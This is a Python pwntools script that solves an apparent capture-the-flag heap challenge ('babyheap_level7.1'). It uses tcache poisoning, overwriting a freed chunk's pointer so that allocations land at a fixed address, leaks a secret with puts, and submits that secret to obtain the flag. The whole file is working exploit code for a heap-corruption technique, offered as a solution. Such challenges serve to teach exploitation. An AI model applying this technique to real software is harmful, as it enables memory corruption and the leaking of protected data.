from pwn import *
BINARY = "/challenge/babyheap_level7.1"
p = process(BINARY)

secret = b''

def get_byte_on_heap(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'424')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'424')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'424')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'424')
    p.sendline(b'puts')
    p.sendline(b'1')
    p.recvuntil(b'Data: ')
    return p.recvuntil(b'\n')[:-1]
addr = 0x425358
secret = get_byte_on_heap(p64(addr+8))
secret = get_byte_on_heap(p64(addr)) + secret
print(secret)
p.kill()
p.close()

p = process(BINARY)

p.sendline(b'send_flag')
p.recv()
p.sendline(secret)

p.interactive()